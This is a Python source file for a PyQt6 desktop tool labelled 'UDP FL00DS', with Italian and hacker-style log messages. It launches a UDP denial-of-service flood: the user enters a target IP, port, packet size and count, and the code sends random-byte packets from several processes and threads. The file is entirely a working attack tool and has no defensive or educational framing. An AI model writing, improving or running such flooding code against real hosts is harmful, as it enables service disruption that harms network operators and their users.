import socket as sock
import sys
import random
import threading
from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt
from scapy.all import IP, UDP, Raw, send
import multiprocessing

class GUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("UDP FL00DS")
        self.setGeometry(200, 200, 400, 400)
        self.centralWidget = QWidget()
        self.layout = QVBoxLayout()
        
        self.layout.addWidget(QLabel("IP Address"))
        self.ip_in = QLineEdit()
        self.layout.addWidget(self.ip_in)
        
        self.layout.addWidget(QLabel("Port"))
        self.port_in = QLineEdit()
        self.layout.addWidget(self.port_in)
        
        self.layout.addWidget(QLabel("Thread (int)"))
        self.n_thread = QLineEdit()
        self.layout.addWidget(self.n_thread)
        
        self.layout.addWidget(QLabel("Dimensioni pacchetti (byte)"))
        self.p_size = QLineEdit()
        self.layout.addWidget(self.p_size)
        
        self.layout.addWidget(QLabel("Numero pacchetti (int)"))
        self.n_pack = QLineEdit()
        self.layout.addWidget(self.n_pack)
                
        self.prog_b = QTextEdit()
        self.prog_b.setReadOnly(True)
        self.layout.addWidget(self.prog_b)
        
        self.flood_b = QPushButton("FL00D")
        self.flood_b.clicked.connect(self.start_flood)
        self.layout.addWidget(self.flood_b)
        
        self.centralWidget.setLayout(self.layout)
        self.setCentralWidget(self.centralWidget)
    
    def log(self, sms):
        self.prog_b.append(sms)
        self.prog_b.verticalScrollBar().setValue(self.prog_b.verticalScrollBar().maximum())  
    
    def packet(self, size):
        return random.randbytes(size)
    
    def flood_w(self, t_ip, t_po, p_size, num_pack):
        try:
            plug = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
            for _ in range(num_pack):
                packet = self.packet(p_size)
                plug.sendto(packet, (t_ip, t_po))
        except Exception as e:
            self.log(f"3RR0R: {e}")
    
    def flood_p(self, t_ip, t_po, p_size, n_thread, num_pack):
        threads = []
        packets_per_thread = num_pack // n_thread
        for i in range(n_thread):
            thread = threading.Thread(
                target=self.flood_w, 
                args=(t_ip, t_po, p_size, packets_per_thread), 
                daemon=True
            )
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
    
    def start_flood(self):
        t_ip = self.ip_in.text()
        try:
            t_po = int(self.port_in.text())
            n_thread = int(self.n_thread.text())
            p_size = int(self.p_size.text())
            num_pack = int(self.n_pack.text())
            n_process = 4  # Configurabile
        except ValueError:
            self.log("Invalid input!")
            return
        
        try:
            sock.inet_aton(t_ip)
        except sock.error:
            self.log("IP non valido!")
            return
        
        self.log(f"Flooding target {t_ip}:{t_po} - {n_process} processes, {n_thread} threads each, {num_pack} total packets")
        processes = []        
        packets_per_process = num_pack // n_process
        for _ in range(n_process):
            process = multiprocessing.Process(
                target=self.flood_p, 
                args=(t_ip, t_po, p_size, n_thread, packets_per_process)
            )
            processes.append(process)
            process.start()
        
        for process in processes:
            process.join()
        
        self.log("FL00D3D - FRA TUTTO ALLAGATO")
                
if __name__ == '__main__':
    qapp = QApplication(sys.argv)
    fin = GUI()
    fin.show()
    sys.exit(qapp.exec())